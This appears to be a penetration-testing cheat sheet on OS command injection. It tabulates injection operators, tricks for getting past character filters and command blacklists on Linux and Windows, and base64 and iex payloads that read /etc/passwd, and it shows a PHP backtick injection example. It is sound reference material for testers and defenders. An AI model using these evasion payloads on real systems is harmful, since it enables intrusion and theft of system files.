# OS Command Injection

## **Introduction**

> * Injection vulnerabilities are considered the number 3 risk in OWASP's Top 10 Web App Risks, given their high impact and how common they are.
> * Injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed, which may lead to subverting the intended outcome of the query to a different outcome that is useful to the attacker.
> * When it comes to OS Command Injections, the user input we control must directly or indirectly go into (or somehow affect) a web query that executes system commands.

***

## **OS Command Injection Tools**

* [Linux - Bash Obfuscator](https://github.com/Bashfuscator/Bashfuscator)
* [Windows - DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
* Auto tool - [https://github.com/commixproject/commix](https://github.com/commixproject/commix)

***

## **Injection Operators**

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                           |
| ------------------ | ------------------- | --------------------- | ------------------------------------------ |
| Semicolon          | ;                   | %3b                   | Both                                       |
| New Line           |                     | %0a                   | Both                                       |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)         |
| AND                | &&                  | %26%26                | Both (only if first succeeds)              |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails)               |
| Sub-Shell          | \`\`                | %60%60                | Both (Linux-only)                          |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |

***

## **Linux Filtered Character Bypass**

| Filtered Character | Bypass Method           | Description                                                                      |
| ------------------ | ----------------------- | -------------------------------------------------------------------------------- |
| printenv command   | `printenv`              | Can be used to view all environment variables                                    |
| Space Character    | %09                     | Using tabs instead of spaces                                                     |
| Space Character    | ${IFS}                  | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
| Space Character    | {ls,-la}                | Commas will be replaced with spaces                                              |
| `/` Character      | ${PATH:0:1}             | Will be replaced with /                                                          |
| `;` Character      | ${LS\_COLORS:10:1}      | Will be replaced with ;                                                          |
| Any Character      | $(tr '!-}' '"-\~'<<<\[) | Shift character by one (\[ -> )                                                  |

***

## **Windows Filtered Character Bypass**

| Filtered Character | Bypass Method          | Description                                                  |
| ------------------ | ---------------------- | ------------------------------------------------------------ |
| Env command        | Get-ChildItem Env      | Can be used to view all environment variables - (PowerShell) |
| Space Character    | %09                    | Using tabs instead of spaces                                 |
| Space Character    | %PROGRAMFILES:\~10,-5% | Will be replaced with a space - (CMD)                        |
| Space Character    | $env:PROGRAMFILES\[10] | Will be replaced with a space - (PowerShell)                 |
| `\` Character      | %HOMEPATH:\~0,-17%     | Will be replaced with `\` - (CMD)                            |
| `\` Character      | $env:HOMEPATH\[0]      | Will be replaced with `\` - (PowerShell)                     |

***

## **Linux Blacklisted Command Bypass**

| Blacklist Bypass         | Payload                                                      | Description                         |
| ------------------------ | ------------------------------------------------------------ | ----------------------------------- |
| Case Manipulation        | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Execute command regardless of cases |
| Case Manipulation        | `$(a="WhOaMi";printf %s "${a,,}")`                           | Another variation of the technique  |
| Reversing a Command      | `echo 'whoami' \| rev`                                       | Reverse a string                    |
| Reversing a Command      | `$(rev<<<'imaohw')`                                          | Execute reversed command            |
| Base64 Encoding Commands | `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
| Base64 Encoding Commands | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |

***

## **Windows Blacklisted Command Bypass**

| Blacklist Bypass         | Payload                                                                                               |
| ------------------------ | ----------------------------------------------------------------------------------------------------- |
| Case Manipulation        | `WhoAmi`                                                                                              |
| Reversing a Commands     | `"whoami"[-1..-20] -join ''`                                                                          |
| Reversing a Commands     | `iex "$('imaohw'[-1..-20] -join '')"`                                                                 |
| Base64 Encoding Commands | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                       |
| Base64 Encoding Commands | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64OUT')))"` |

***

## Miscellaneous & Tricks

{% hint style="info" %}
This section contains tricks for specific languages and web frameworks
{% endhint %}

***

### PHP backtick character

The backtick character (`` `) `` in PHP can be used to gain OS command injection, as it is a character used for shell commands execution, similarly to `shell_exec()`function.

When you enclose a string in backticks, PHP will execute it as a shell command and return the output.

Consider the following example scenario:

1. You are dealing with a web application written in PHP where a `ping.php` page is hosted.
2. Navigating to `http://example.com/ping.php?ip=10.10.10.10` allows users to ping the ip address specified (10.10.10.10)
3. If any standard way to perform OS command execution does not work, you could use the backticks to your advantage. For example, you could navigate to:\
   `` http://example.com/ping.php?ip=10.10.10.10;`ls` `` \
   to effectively run the `ls` command after the ping
